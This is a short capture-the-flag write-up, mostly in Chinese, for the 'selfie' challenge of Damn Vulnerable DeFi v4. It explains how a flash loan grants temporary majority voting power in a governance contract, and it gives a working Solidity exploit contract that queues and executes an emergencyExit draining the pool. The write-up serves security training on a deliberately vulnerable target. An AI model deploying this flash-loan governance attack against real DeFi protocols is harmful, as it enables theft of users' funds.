# Damn Vulnerable DeFi v4 - selfie

- https://www.damnvulnerabledefi.xyz/challenges/selfie/

## check condition

抽光 pool 所有資金並轉移至 recovery:

```solidity
assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
assertEq(
    token.balanceOf(recovery),
    TOKENS_IN_POOL,
    "Not enough tokens in recovery account"
);
```

## break

主因源於可以透過 flashloan 增加自己的投票權。在 Goverance 合約設計上，通常會以持有代幣數量作為票數或是投票權利，提案有一定同意票數才可以執行。

本例中，Goverance 提案需要一半 total supply 以上的同意，才可以提案，可以以 flashloan 借出來繞過檢查：

```solidity
function _hasEnoughVotes(address who) private view returns (bool) {
    uint256 balance = _votingToken.getVotes(who);
    uint256 halfTotalSupply = _votingToken.totalSupply() / 2;
    return balance > halfTotalSupply;
}
```

## solution

```solidity
contract Trigger is IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        // delegate vote
        DamnValuableVotes(token).delegate(address(this));

        // propose an action
        action_id = governance.queueAction(
            address(pool),
            0,
            abi.encodeCall(SelfiePool.emergencyExit, (recovery))
        );

        // repay flashloan
        DamnValuableVotes(token).approve(address(pool), type(uint256).max);
        return CALLBACK_SUCCESS;
    }

    function exec() external {
        governance.executeAction(action_id);
    }
}
```
